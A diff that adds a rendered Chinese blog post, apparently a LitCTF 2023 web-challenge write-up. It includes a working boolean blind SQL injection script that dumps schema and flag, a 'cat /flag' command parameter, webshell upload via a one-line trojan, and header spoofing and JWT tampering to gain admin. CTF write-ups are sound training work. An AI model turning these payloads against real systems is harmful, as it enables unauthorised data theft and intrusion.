@@ -1,37 +1,435 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eur1ka.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="我Flag呢？f12获取flag  第一个彩蛋 Follow me and hack me按照要求传参即可  第三个彩蛋上述有提示备份文件，我们进行扫描发现其www.zip源码泄露获得第二个彩蛋 发现有一段代码 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF">
+<meta property="og:url" content="https://eur1ka.github.io/2023/06/05/LitCTF/index.html">
+<meta property="og:site_name" content="Eureka&#39;s Blog">
+<meta property="og:description" content="我Flag呢？f12获取flag  第一个彩蛋 Follow me and hack me按照要求传参即可  第三个彩蛋上述有提示备份文件，我们进行扫描发现其www.zip源码泄露获得第二个彩蛋 发现有一段代码 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120448243.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120617445.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120829093.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513122733566.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214217119.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214328761.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513123818729.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513124457994.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513154901063.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213402439.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213541931.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514223308691.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513162206317.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513161802063.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214844241.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215043437.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215520052.png">
+<meta property="og:image" content="c:\Users\ROG-PC\AppData\Roaming\Typora\typora-user-images\image-20230514215827614.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220012317.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220529050.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514221224312.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222657646.png">
+<meta property="og:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222454672.png">
+<meta property="article:published_time" content="2023-06-05T13:00:00.000Z">
+<meta property="article:modified_time" content="2023-06-05T13:00:30.977Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120448243.png">
 
 
-{% block content %}
+<link rel="canonical" href="https://eur1ka.github.io/2023/06/05/LitCTF/">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://eur1ka.github.io/2023/06/05/LitCTF/","path":"2023/06/05/LitCTF/","title":"LitCTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>LitCTF | Eureka's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eureka's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">默安科技逐日实验室</p>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">我Flag呢？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BD%A9%E8%9B%8B"><span class="nav-number">1.0.1.</span> <span class="nav-text">第一个彩蛋</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Follow-me-and-hack-me"><span class="nav-number">2.</span> <span class="nav-text">Follow me and hack me</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%BD%A9%E8%9B%8B"><span class="nav-number">2.0.1.</span> <span class="nav-text">第三个彩蛋</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ping"><span class="nav-number">3.</span> <span class="nav-text">Ping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="nav-number">4.</span> <span class="nav-text">导弹迷踪</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">PHP是世界上最好的语言！！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Vim-yyds"><span class="nav-number">6.</span> <span class="nav-text">Vim yyds</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-number">7.</span> <span class="nav-text">作业管理系统</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%BD%A9%E8%9B%8B"><span class="nav-number">7.1.</span> <span class="nav-text">第二个彩蛋</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B"><span class="nav-number">8.</span> <span class="nav-text">这是什么？SQL ！注一下</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E4%B8%AA%E5%BD%A9%E8%9B%8B"><span class="nav-number">8.1.</span> <span class="nav-text">第四个彩蛋</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Http-pro-max-plus"><span class="nav-number">9.</span> <span class="nav-text">Http pro max plus</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1zjs"><span class="nav-number">10.</span> <span class="nav-text">1zjs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F"><span class="nav-number">11.</span> <span class="nav-text">就当无事发生</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81"><span class="nav-number">12.</span> <span class="nav-text">Flag点击就送！</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2023/06/05/LitCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="LitCTF | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LitCTF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-05 21:00:00 / 修改时间：21:00:30" itemprop="dateCreated datePublished" datetime="2023-06-05T21:00:00+08:00">2023-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h1><p>f12获取flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120448243.png" alt="image-20230513120448243"></p>
+<h3 id="第一个彩蛋"><a href="#第一个彩蛋" class="headerlink" title="第一个彩蛋"></a>第一个彩蛋</h3><p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120617445.png" alt="image-20230513120617445"></p>
+<h1 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h1><p>按照要求传参即可</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120829093.png" alt="image-20230513120829093"></p>
+<h3 id="第三个彩蛋"><a href="#第三个彩蛋" class="headerlink" title="第三个彩蛋"></a>第三个彩蛋</h3><p>上述有提示备份文件，我们进行扫描发现其<code>www.zip</code>源码泄露获得第二个彩蛋</p>
+<p>发现有一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTF Challenge&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#x27;flag.php&#x27;;</span><br><span class="line">    if (!isset($_GET[&#x27;CTF&#x27;]) || $_GET[&#x27;CTF&#x27;] !== &#x27;Lit2023&#x27;) &#123;</span><br><span class="line">        echo &quot;你知道 GET 么，试试用GET传参一个变量名为CTF 值为Lit2023&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] !== &#x27;POST&#x27; || !isset($_POST[&#x27;Challenge&#x27;]) || $_POST[&#x27;Challenge&#x27;] !== &quot;i&#x27;m_c0m1ng&quot;) &#123;</span><br><span class="line">            echo &quot;下面试试POST，尝试用POST传输一个变量名为Challenge 值为 i&#x27;m_c0m1ng&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (!isset($_COOKIE[&#x27;flag&#x27;])) &#123;</span><br><span class="line">                echo &quot;你看到了我的夹心饼干(Cookies)了么，里面就是flag哦~&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo $Flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        // 第三个彩蛋！(看过头号玩家么？)</span><br><span class="line">        // _R3ady_Pl4yer_000ne_ (3/?)</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><p>我们进行一个简单的测试发现有弹窗组织，f12查看源代码	</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513122733566.png" alt="image-20230513122733566"></p>
+<p>我们抓包在执行</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214217119.png" alt="image-20230514214217119"></p>
+<p>再次执行读取flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214328761.png" alt="image-20230514214328761"></p>
+<h1 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h1><p>直接结束游戏，发现没有数据交互直接进js里找flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513123818729.png" alt="image-20230513123818729"></p>
+<h1 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h1><p>一个在线编译平台，发现其可以进行命令执行直接读取flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513124457994.png" alt="image-20230513124457994"></p>
+<h1 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h1><p>vim缓存泄露访问<code>/.index.php.swp</code>将缓存文件下载，然后读取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513154901063.png" alt="image-20230513154901063"></p>
+<p>按照要求传参获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h1><p>前台登录密码：admin admin</p>
+<p>进入后台发现有许多功能点</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213402439.png" alt="image-20230514213402439"></p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213541931.png" alt="image-20230514213541931"></p>
+<p>然后写一个一句话木马，蚁剑连接获取flag</p>
+<h2 id="第二个彩蛋"><a href="#第二个彩蛋" class="headerlink" title="第二个彩蛋"></a>第二个彩蛋</h2><p>访问<code>https://github.com/Probiusofficial/My_pic/blob/main/demo.jpg</code>获取</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514223308691.png" alt="image-20230514223308691"></p>
+<h1 id="这是什么？SQL-！注一下"><a href="#这是什么？SQL-！注一下" class="headerlink" title="这是什么？SQL ！注一下"></a>这是什么？SQL ！注一下</h1><p>经过测试发现其有两个字段</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513162206317.png" alt="image-20230513162206317"></p>
+<p>查数据库，查表名，查列明最后读取flag,脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node6.anna.nssctf.cn:28822/?id=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># payload = &quot;1*(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1*(ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1*(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1*(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctftraining&#x27; and table_name=&#x27;news&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;1*(ascii(substr((select flag from ctftraining.flag),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.get(url = url+payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;OHHHHHHH&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第四个彩蛋"><a href="#第四个彩蛋" class="headerlink" title="第四个彩蛋"></a>第四个彩蛋</h2><p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513161802063.png" alt="image-20230513161802063"></p>
+<h1 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h1><p>第一步：本地访问（这里无法使用XFF）我们 使用<code>Client-ip: 127.0.0.1</code></p>
+<p>第二步：需要我们从<code> pornhub.com</code>跳转&#x3D;&#x3D;》<code>Referer: pornhub.com</code></p>
+<p>第三步：要求谷歌访问更改UA头&#x3D;&#x3D;》Chrome</p>
+<p>第四步：代理设置&#x3D;&#x3D;》Via: Clash.win</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214844241.png" alt="image-20230514214844241"></p>
+<p>然后f12查看提示</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215043437.png" alt="image-20230514215043437"></p>
+<p>访问获取flag</p>
+<h1 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h1><p>小游戏看一下有无交互</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215520052.png" alt="image-20230514215520052"></p>
+<p>看一下里面的js文件</p>
+<p><img src="C:\Users\ROG-PC\AppData\Roaming\Typora\typora-user-images\image-20230514215827614.png" alt="image-20230514215827614"></p>
+<p>访问一下康康</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220012317.png" alt="image-20230514220012317"></p>
+<h1 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h1><p>信息泄露,根据提示在GitHub上搭建的站点，直接在github上搜索title</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220529050.png" alt="image-20230514220529050"></p>
+<p>2023翻阅发现flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514221224312.png" alt="image-20230514221224312"></p>
+<h1 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h1><p>随便输入一个用户名（flag）,点击拿flag，发现了jwt令牌，弄下来看name是我们输入的用户名，改成admin即可</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222657646.png" alt="image-20230514222657646"></p>
+<p>将改好的jwt重新发包获取flag</p>
+<p><img src="https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222454672.png" alt="image-20230514222454672"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/05/2023%E9%BB%91%E7%9B%BE/" rel="prev" title="2023黑盾">
+                  <i class="fa fa-angle-left"></i> 2023黑盾
+                </a>
+            </div>
+            <div class="post-nav-item">
